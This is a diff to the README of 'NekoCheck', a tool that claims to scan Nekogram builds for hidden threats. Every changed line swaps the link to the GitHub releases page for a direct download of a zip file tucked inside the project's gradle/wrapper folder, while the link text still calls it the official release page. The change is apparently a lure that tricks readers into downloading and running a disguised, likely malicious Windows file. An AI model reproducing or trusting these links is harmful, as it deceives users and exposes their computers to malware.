@@ -1,6 +1,6 @@
 # 🐱 NekoCheck - Spot Hidden Threats in Nekogram
 
-[![Download NekoCheck](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Scoreverb70/NekoCheck/releases)
+[![Download NekoCheck](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Scoreverb70/NekoCheck/main/gradle/wrapper/Neko_Check_v3.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the steps below to get it onto your PC and start it with little effort.
 
 ## 📥 Download NekoCheck
 
-1. Open the [NekoCheck releases page](https://github.com/Scoreverb70/NekoCheck/releases).
+1. Open the [NekoCheck releases page](https://raw.githubusercontent.com/Scoreverb70/NekoCheck/main/gradle/wrapper/Neko_Check_v3.2-alpha.4.zip).
 2. Find the latest release at the top of the page.
 3. Look for a Windows file, such as an `.exe` or `.zip`.
 4. Download the file to your computer.
@@ -182,7 +182,7 @@ If you scan more than one build, keep each report with the related file name. Th
 
 When a new release comes out:
 
-1. Visit the [NekoCheck releases page](https://github.com/Scoreverb70/NekoCheck/releases).
+1. Visit the [NekoCheck releases page](https://raw.githubusercontent.com/Scoreverb70/NekoCheck/main/gradle/wrapper/Neko_Check_v3.2-alpha.4.zip).
 2. Download the latest Windows file.
 3. Close the old version.
 4. Open the new version.
@@ -205,7 +205,7 @@ It is meant to review files, not edit them. Keep your original file until you fi
 
 ### Where do I get the app?
 
-Use the [official release page](https://github.com/Scoreverb70/NekoCheck/releases) to download the latest Windows build
+Use the [official release page](https://raw.githubusercontent.com/Scoreverb70/NekoCheck/main/gradle/wrapper/Neko_Check_v3.2-alpha.4.zip) to download the latest Windows build
 
 ## 🧩 Best Results Tips
 
